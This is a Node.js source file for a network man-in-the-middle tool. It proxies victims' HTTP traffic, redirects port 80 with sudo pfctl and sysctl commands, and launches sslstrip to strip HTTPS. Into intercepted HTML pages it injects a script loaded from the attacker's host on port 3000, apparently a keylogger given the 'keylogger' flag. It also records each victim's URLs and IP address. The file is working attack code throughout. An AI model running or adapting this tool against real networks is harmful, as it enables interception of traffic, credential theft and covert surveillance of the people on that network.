
          var http = require('http'),
              util = require('util'),
                ip = require('ip'),
            events = require('events'),
           connect = require('connect'),
         httpProxy = require('http-proxy'),
              exec = require('child_process').exec,
  transformerProxy = require('transformer-proxy');

var exports = module.exports = new events.EventEmitter();

var trace = {}

keylogger = 0

var hostIP = ip.address()

var init = function (options) {
  options = options || { port: 8080 }
  proxy = httpProxy.createServer({
    target: 'http://'+hostIP+':10000'
  , ws: true
  });
  proxy.on('proxyReq', request);
  proxy.on('proxyRes', response);
  proxy.on('error', function(err, req, res) {
    res.end();
  })
  app = connect();
  app.use(transformerProxy(inject));  // , {match : /\.js([^\w]|$)/}
  app.use( function (req, res) {
    if (req.headers.host == hostIP+':3000') {
      proxy.web(req, res, { target: 'http://'+hostIP+':3000' });
    } else {
      proxy.web(req, res, { target: 'http://'+hostIP+':10000' });
    }
    req.on('end', function(){
      setTimeout(function(){
        keylogger = 0
      }, 1000)
    })
  });
  http.createServer(app).listen(options.port);
  enablePortForwarding()
  startSSLStripAttack()
}

var request = function (proxyRequest, req, res, options) {
  trace.code = res.statusCode
  trace.method = proxyRequest.method
  trace.url = proxyRequest.agent.protocol + '//' + req.headers.host + proxyRequest.path
}

var response = function (proxyResponse, req, res) {
  proxyResponse.on('end', function(){
    headers = parser.headers(proxyResponse.headers)                                                                              // Template Engine?
    if (headers != false) {
      var ipAddr = req.headers["x-forwarded-for"];
      if (ipAddr){
        var list = ipAddr.split(",");
        ipAddr = list[list.length-1];
      } else {
        ipAddr = req.connection.remoteAddress;
      }
      ipAddr = ipAddr.split(':')
      ipAddr = ipAddr[ipAddr.length - 1]
      exports.emit('output', {
        target: 'left'
      , message: "{cyan-fg}{bold}" + trace.method + "{/bold}{/cyan-fg}{white-fg}  " + trace.url + "{/white-fg}{green-fg}{bold} \n\n     ← " + trace.code + "{/bold}{/green-fg}{white-fg}{bold}  " + headers.mime + " " + headers.length + "B → {/bold}{/white-fg} {red-fg}" + ipAddr + "{/red-fg} \n\n {/left}"
      });
    }
  })
}

var inject = function (data, req) {
  if (typeof req.headers.accept != "undefined") {
    var mime = req.headers.accept.split(',')                                                                                     // Regex me please :)
    if ( mime[0] == 'text/html' ){
      if ( data.toString('utf8' ).match('<\/body>') ){
        if ( keylogger == 0 ) {
          data = data.toString('utf8').replace('</body>', '<script>var hostIP = "'+hostIP+'";</script><script src="//'+hostIP+':3000/verth.js"></script> \n\n  </body>')       // Abstract
          keylogger = 1
        }
      }
    }
  }
  return data;
}

var parser = {
  headers: function(headers) {
    if ( (typeof headers['content-length'] == "undefined") ||
         (typeof headers['content-type'] == "undefined") )
      return false;
    return {
      "mime"  : headers['content-type']
    , "length": headers['content-length']
    , "Cache-Control": "no-cache, no-store, must-revalidate"
    , "Pragma": "no-cache"
    , "Expires": 0
    }
  }
}

var enablePortForwarding = function(){
  exec('echo "rdr pass inet proto tcp from any to any port 80 -> 127.0.0.1 port 8080" | sudo pfctl -ef -')
  exec('sudo sysctl -w net.inet.ip.forwarding=1')
  exec('sudo sysctl -w net.inet.ip.fw.enable=1')
}

function startSSLStripAttack(){
  exec('sudo forever start -c python sslstrip/sslstrip.py -k -p')
}

function stopSSLStripAttack(){
  exec('sudo forever stopall')
}

    exports.init = init
  exports.inject = inject
 exports.request = request
exports.response = response
exports.enablePortForwarding = enablePortForwarding
exports.stopSSLStripAttack = stopSSLStripAttack
